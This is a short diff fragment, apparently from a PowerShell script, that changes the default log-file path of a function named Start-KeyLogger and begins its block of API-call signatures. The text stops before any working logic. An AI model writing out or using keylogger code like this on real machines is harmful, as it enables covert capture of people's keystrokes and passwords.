@@ -1,4 +1,4 @@
-function Start-KeyLogger($Path="C:\Users\ffurfaro\Desktop\k.txt") 
+function Start-KeyLogger($Path="C:\Users\francesco\Desktop\k.txt") 
 {
   # Signatures for API Calls
   $signatures = @'
